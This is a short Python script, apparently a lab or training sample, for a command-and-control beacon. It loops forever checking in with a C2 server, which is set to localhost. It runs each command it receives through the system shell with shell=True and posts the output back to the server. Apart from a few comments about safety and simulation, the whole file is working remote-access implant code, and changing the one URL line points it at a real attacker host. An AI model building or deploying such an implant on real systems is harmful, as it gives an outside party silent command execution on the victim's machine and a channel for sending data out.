import urllib.request
import urllib.parse
import subprocess
import time
import sys

# Configuration: Point to the server (listener) (Using localhost for safety/testing)
C2_URL = "http://127.0.0.1:8080"
CHECK_IN_INTERVAL = 5  # Time in seconds between check-ins (simulates "heartbeat")

print("[*] Target Beacon Started. Initiating callback loop..")

while True:
    try:
        # 1. Send a GET request to the C2 server to fetch instructions
        req = urllib.request.Request(C2_URL, method='GET')
        with urllib.request.urlopen(req) as response:
            command = response.read().decode('utf-8').strip()
        
        # 2. Check if a valid command was received
        if command != "NONE":
            print(f"[+] Received command from C2: {command}")
            
            # 3. Execute the command on the OS (this handles both Windows and Linux)
            # shell=True allows native commands like 'whoami' or 'dir'/'ls'
            proc = subprocess.Popen(
                command, 
                shell=True, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE, 
                stdin=subprocess.PIPE
            )
            stdout_value, stderr_value = proc.communicate()
            
            # Combine standard output and standard error
            output = stdout_value + stderr_value
            if not output:
                output = b"[!] Command executed successfully with no returned output."
            
            # 4. POST the results back to the C2 server
            post_req = urllib.request.Request(C2_URL, data=output, method='POST')
            urllib.request.urlopen(post_req)
            print("[+] Execution output sent back to C2 server.")
            
    except urllib.error.URLError:
        # Silent pass if the listener isn't up yet (simulates network resilience)
        pass
    except KeyboardInterrupt:
        print("\n[*] Exiting beacon...")
        sys.exit(0)
        
    # Wait before checking in again (this avoids flooding the network)
    time.sleep(CHECK_IN_INTERVAL)